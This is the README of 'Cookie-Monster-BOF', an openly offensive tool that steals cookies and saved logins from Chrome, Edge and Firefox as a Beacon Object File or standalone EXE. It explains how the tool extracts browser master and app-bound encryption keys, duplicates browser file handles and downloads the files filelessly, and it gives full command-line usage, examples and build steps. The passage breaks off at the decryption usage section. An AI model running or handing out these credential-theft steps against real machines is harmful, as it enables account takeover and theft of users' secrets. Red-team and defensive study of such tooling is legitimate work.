# Cookie-Monster-BOF
Steal browser cookies for edge, chrome and firefox through a BOF or standalone EXE!

Cookie Monster BOF will extract the WebKit Master Key and the App Bound Encryption Key for both Edge and Chrome, locate a browser process with a handle to the Cookies and Login Data files, copy the handle(s) and then filelessly download the target file(s). 

*Note: the EXE does not support fileless download but instead copies to a default database for extraction later.*

Once the Cookies/Login Data file(s) are downloaded, the python decryption script can be used to extract those secrets! Firefox module will parse the profiles.ini and locate where the logins.json and key4.db files are located and download them. A seperate github repo is referenced for offline decryption.  

Chrome & Edge 127+ Updates: new chromium browser cookies (v20) use the app bound key to encrypt the cookies. As a result, this makes retrieving the app_bound_encrypted_key slightly more difficult. Thanks to [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824) this process can be accomplished without having to escalate your privileges. The catch is your process must be running out of the web browser's application directory. i.e. must inject into Chrome/Edge or spawn a beacon from the same application directory as the browser. 

Latest update allows you to decrypt cookies as SYSTEM and without having to inject into the browser process! Shoutout to @sdemius for the discovering how to decrypt the Chrome's [PostProcessData](https://source.chromium.org/chromium/chromium/src/+/main:chrome/elevation_service/elevator.cc;l=216;bpv=1) function and @b1scoito [explanation](https://github.com/moonD4rk/HackBrowserData/issues/431#issuecomment-2606665195)! Chrome 137+ changed the PostProcessData() function once again, shoutout to [@runassu](https://github.com/runassu/chrome_v20_decryption) for figuring it out! 
 
## Limitations in Standalone EXE
- The executable does not properly copy the cookies or login databases with the browser process still running.
- To copy the databases, you must kill the browser process and manually copy them. This does not require local administrator. 

## BOF Usage
```
Usage: cookie-monster [--chrome || --edge || --system <Local State File Path> <PID> || --firefox || --chromeCookiePID <PID> || --chromeLoginDataPID <PID> || --edgeCookiePID <PID> || --edgeLoginDataPID <PID> ] [--cookie-only] [--key-only] [--login-data-only] [--copy-file "C:\Folder\Location\"] 
cookie-monster Examples: 
   cookie-monster --chrome 
   cookie-monster --edge
   cookie-monster --system "C:\Users\<USER>\AppData\Local\<BROWSER>\User Data\Local State" <PID>
   cookie-moster --firefox 
   cookie-monster --chromeCookiePID <PID>
   cookie-monster --chromeLoginDataPID <PID> 
   cookie-monster --edgeCookiePID <PID> 
   cookie-monster --edgeLoginDataPID <PID> 
cookie-monster Options: 
    --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD 
    --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD 
    --system, Decrypt chromium based browser app bound encryption key without injecting into browser. Requires path to Local State file and PID of a user process for impersonation 
    --firefox, looks for profiles.ini and locates the key4.db and logins.json file 
    --chromeCookiePID, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file 
    --chromeLoginDataPID, if chrome PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file   
    --edgeCookiePID, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file 
    --edgeLoginDataPID, if edge PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file  
    --key-only, only retrieve the app bound encryption key. Do not attempt to download the Cookie or Login Data files. 
    --cookie-only, only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key. 
    --login-data-only, only retrieve the Login Data file. Do not attempt to download Cookie file or retrieve app bound encryption key.  
    --copy-file, copies the Cookie and Login Data file to the folder specified. Does not use fileless retrieval method.   
```
## Compile BOF 
Ensure Mingw-w64 and make is installed on the linux prior to compiling.
```bash
# to make all binaries
make

# to make just the BOF
make bof

# to make just the exe
make exe
```

## Decryption Steps
Install requirements
```
pip3 install -r requirements.txt
```

Usage
```
